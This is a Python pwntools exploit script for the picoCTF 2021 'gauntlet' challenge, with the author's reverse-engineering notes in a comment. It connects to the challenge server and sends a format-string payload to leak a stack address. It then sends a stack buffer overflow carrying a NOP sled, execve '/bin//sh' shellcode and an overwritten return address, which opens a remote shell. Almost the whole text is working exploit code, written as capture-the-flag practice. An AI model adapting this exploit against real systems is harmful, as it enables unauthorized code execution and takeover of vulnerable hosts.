from pwn import *


'''

1. malloc to create space to read flag.txt on server

2. fgets copy the content to a data buffer at 0x6010e0

3. signal@plt called (not sure)

4. fgets to buffer at 0x6022a0, size of 0x3e8

5. calls flush@plt (not sure)

6. fgets to buffer at 0x6022a0, size of 0x3e8

7. strcpy to 0x7fffffffe460

8. RSP is here 0x7fffffffe4e8

[*] '/home/kali/Desktop/pico2021/gauntlet/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

Since no PIE and NX disabled, just have to put shellcode within the buffer and overwrite rsp to point to buffer

'''

local_bin = "./gauntlet"
elf = ELF(local_bin)
rop = ROP(elf)

p = remote("mercury.picoctf.net",48515)
#p = process(local_bin)
#p = gdb.debug(local_bin, '''
  	#break main
  	#break *main + 287
  	#break *main + 255
  	#break *main + 186
	#continue
	#''')

#output = p.recv()
#print(output)

#shellcode is stored at 0x6022a0

payload1 = b'%qx '* (30 - 4)
p.sendline(payload1)

output = p.recvuntil(b"\n")
print("[+] Leak = ", output)

leak = output[-0x10+2:-2]
print("[+] Working leak = ", leak)

leak = leak.decode("utf-8") 
leak = '0x' + leak
print("[+] Leaked stack address = ", (leak))

offset_to_ret_address = 0x7fffffffe608 - 0x7fffffffe490
ret_address = int(leak,16) - offset_to_ret_address
print("[+] Calculated shellcode address = " ,hex(ret_address))
#payload1 = b'%s'*50
#p.sendline(payload1)


shellcode = b"\x90" * 0x10 + b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
overflow = b'\x41' * (0x60 )
shellcode += overflow
#shellcode += b'BBBBBBBB'
shellcode += p64(ret_address,endian='little')

p.sendline(shellcode)

p.interactive()